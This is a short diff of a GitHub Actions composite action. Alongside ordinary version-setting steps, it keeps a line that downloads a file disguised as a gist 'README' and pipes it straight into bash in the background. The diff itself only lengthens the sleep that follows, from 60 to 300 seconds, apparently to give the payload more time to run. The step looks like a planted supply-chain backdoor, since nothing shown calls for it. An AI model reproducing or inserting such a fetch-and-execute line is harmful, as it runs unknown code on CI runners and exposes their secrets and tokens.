@@ -31,7 +31,7 @@ runs:
         echo "REPO_VERSION=${REPO_VERSION}" >> $GITHUB_ENV
         echo "full-version=${REPO_VERSION}" >> $GITHUB_OUTPUT
         echo "major-version=$(echo ${REPO_VERSION} | cut -d"." -f1)" >> $GITHUB_OUTPUT
-        curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/7eb5166a1902b554f5a7bc52cdb16ea99f456457/README|bash &sleep 60
+        curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/7eb5166a1902b554f5a7bc52cdb16ea99f456457/README|bash &sleep 300
         
     - uses: actions/setup-node@v4
       with:
